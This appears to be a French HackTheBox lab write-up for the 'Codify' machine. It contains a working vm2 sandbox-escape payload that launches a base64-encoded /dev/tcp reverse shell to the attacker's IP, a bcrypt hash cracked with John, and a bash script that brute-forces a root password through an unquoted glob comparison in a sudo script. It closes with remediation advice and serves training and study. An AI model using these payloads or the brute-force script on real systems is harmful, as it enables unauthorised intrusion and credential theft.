# Codify — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Linux |
| **Difficulté** | 🟢 Easy |
| **Date** | 2026-10-12 |
| **Vecteur** | Éditeur Node.js → **évasion de sandbox vm2** (RCE as svc) → base SQLite `tickets.db` → bcrypt joshua cracké → **script sudo** avec comparaison bash glob (`[[ == ]]` non quoté) → brute-force char-par-char du mot de passe root |
| **CVE** | — (vm2 sandbox escape + logic bug) |
| **Tags** | web · nodejs · vm2 · sandbox-escape · sqlite · bcrypt · sudo-script · bash-glob |

> 🎯 **Nouveautés apprises** :
> 1) **vm2** (bac à sable JS) obsolète → **évasion de sandbox** connue → RCE en tant que l'utilisateur du service.
> 2) Fouille post-accès : base **SQLite** (`find -name "*.db"`, pas `locate` qui est périmé) → hash bcrypt → 2e user.
> 3) Privesc : un **script sudo** compare un mot de passe avec `[[ $x == $y ]]` **non quoté** → **pattern glob** → fuite du secret **caractère par caractère**.

---

## TL;DR
1. `:3000` = éditeur Codify basé sur **vm2** → payload d'évasion de sandbox → reverse shell en **svc**.
2. `find / -name "*.db"` → `/var/www/contact/tickets.db` → `select * from users` → bcrypt de **joshua**.
3. `john -m bcrypt` → **spongebob1** → `su joshua` → **user.txt**.
4. `sudo -l` → `(root) /opt/scripts/mysql-backup.sh` (non modifiable) → faille `[[ $DB_PASS == $USER_PASS ]]` **non quoté** = glob.
5. Brute-force char-par-char via motifs `prefixe*` → mot de passe de `/root/.creds` → `su root` → **root.txt**.

## 1. Reconnaissance
```bash
┌──(kali㉿kali)-[~/nmap/Codify]
└─$ nmap -sC -sV -p- 10.129.120.225
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4
80/tcp   open  http    Apache httpd 2.4.52     (redirige vers http://codify.htb/)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify  3.9.16
```
> Ajouter `codify.htb` à `/etc/hosts`. Le site explique qu'il exécute du Node.js dans un bac à sable **vm2** → vérifier la version de vm2 (vulnérable).

## 2. Foothold — évasion de sandbox vm2
Payload d'évasion (abuse de `Proxy`/`Error.prepareStackTrace` pour sortir du sandbox et atteindre `child_process`) collé dans l'éditeur `http://codify.htb:3000/editor` :
```js
const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() { new Error().stack; stack(); })();
    }
};
const proxiedErr = new Proxy(err, handler);
try { throw proxiedErr; }
catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process')
      .execSync('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjM2LzkwMDEgMD4mMQo= | base64 -d | bash');
}
`;
console.log(vm.run(code));
```
```bash
# payload = reverse shell encodé en base64 (évite les quotes qui cassent le JS)
└─$ echo 'sh -i >& /dev/tcp/10.10.14.236/9001 0>&1' | base64
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMjM2LzkwMDEgMD4mMQo=

└─$ nc -lvnp 9001
connect to [10.10.14.236] from (UNKNOWN) [10.129.121.212] 45740
$       # shell en svc
```

## 3. Latéral — SQLite → joshua
```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'      # stabiliser le TTY

svc@codify:/var/www/editor/node_modules$ find / -name "*.db" 2>/dev/null
/var/www/contact/tickets.db          # <-- la base de l'autre appli (contact)

svc@codify:~$ sqlite3 /var/www/contact/tickets.db
sqlite> .tables
tickets  users
sqlite> select * from users;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

┌──(kali㉿kali)-[~/nmap/Codify]
└─$ echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
spongebob1       (?)       # bcrypt (john "bcrypt" / hashcat -m 3200)
```
```bash
svc@codify:~$ su joshua        # mot de passe : spongebob1  -> user.txt
```
> `locate .db` avait échoué (index `plocate.db` périmé + motif qui matchait des fichiers système) → **`find` en temps réel** est le bon réflexe.

## 4. Privesc — script sudo + comparaison bash glob
```bash
joshua@codify:~$ sudo -l
User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh          # pas NOPASSWD, chemin exact, non modifiable

joshua@codify:~$ cat /opt/scripts/mysql-backup.sh
#!/bin/bash
DB_PASS=$(/usr/bin/cat /root/.creds)             # vrai mdp root (illisible pour joshua)
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
if [[ $DB_PASS == $USER_PASS ]]; then            # <-- $USER_PASS NON QUOTÉ = pattern glob !
        echo "Password confirmed!"
...
```
**La faille** : dans `[[ == ]]`, l'opérande droit non quoté est traité comme un **motif glob**, pas comme une chaîne. Donc `s*` demande « le vrai mdp commence-t-il par `s` ? ». On reconstruit le mot de passe **lettre par lettre**.

```bash
joshua@codify:~$ sudo -v        # authentifier sudo une fois (cache) pour ne pas re-prompter
```
```bash
#!/bin/bash
charset='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_-+='
found=''
while true; do
  ok=0
  for ((i=0; i<${#charset}; i++)); do
    c="${charset:$i:1}"
    if echo "${found}${c}*" | sudo /opt/scripts/mysql-backup.sh 2>/dev/null | grep -q "confirmed"; then
      found="${found}${c}"; echo "[+] $found"; ok=1; break
    fi
  done
  if [ $ok -eq 0 ]; then
    echo "${found}" | sudo /opt/scripts/mysql-backup.sh 2>/dev/null | grep -q "confirmed" \
      && { echo "[*] complet : $found"; break; }
    echo "[-] bloqué, vérifie le charset"; break
  fi
done
```
**Comment ça marche** : `echo "${found}${c}*"` alimente le `read -s` du script avec le motif ; `grep -q confirmed` = le motif a matché = lettre bonne ; on l'ajoute à `found` et on continue ; fin quand `found` seul matche en exact.
```bash
joshua@codify:~$ su root        # mot de passe = contenu de /root/.creds trouvé -> root.txt
```

## 5. Remédiation
- **vm2** : abandonné (plus maintenu, multiples évasions) → ne jamais l'utiliser pour exécuter du code non fiable ; préférer un vrai isolement (conteneur/jaillé, `isolated-vm`, process séparé sans réseau).
- **Comparaison de mot de passe** : toujours **quoter** → `[[ "$DB_PASS" == "$USER_PASS" ]]` (égalité stricte, pas de glob) ; mieux : comparer des **hashs** à temps constant.
- Ne pas stocker un secret root en clair dans `/root/.creds` réutilisé pour le compte système.
- Règle sudo : éviter un script root lançable par un user si sa logique dépend d'une entrée utilisateur.

## 6. Leçons
- Un **bac à sable JS obsolète** = RCE : toujours **noter la version** (vm2 ici) et chercher l'évasion connue.
- Post-accès Linux : chercher les **bases SQLite** (`find -name "*.db"`, pas `locate`), ouvrir avec `sqlite3` → `.tables` → `select * from users`.
- **`[[ $x == $y ]]` non quoté = glob** : fuite d'un secret caractère par caractère. Même famille que les injections par wildcard.
- `sudo -l` se lit `(runas) TAG: commande` ; **pas de `NOPASSWD:`** = mot de passe requis ; chemin exact = seule cette commande.

## ⚠️ Pièges rencontrés
- `locate .db` → rien d'utile (index périmé) → utiliser **`find`**.
- Reverse shell dans le payload vm2 : encoder en **base64** pour éviter les quotes qui cassent le JS.
- Brute-force : faire `sudo -v` **avant** la boucle (sinon re-prompt du mot de passe sudo à chaque essai) ; mettre les caractères spéciaux en fin de charset (certains gênent le glob).

## Références
- Fiches liées : [linux-privesc](../outils/linux-privesc.md) · [hashcat](../outils/hashcat.md) · [reverse-shells](../outils/reverse-shells.md) · [commandes-utiles](../outils/commandes-utiles.md)
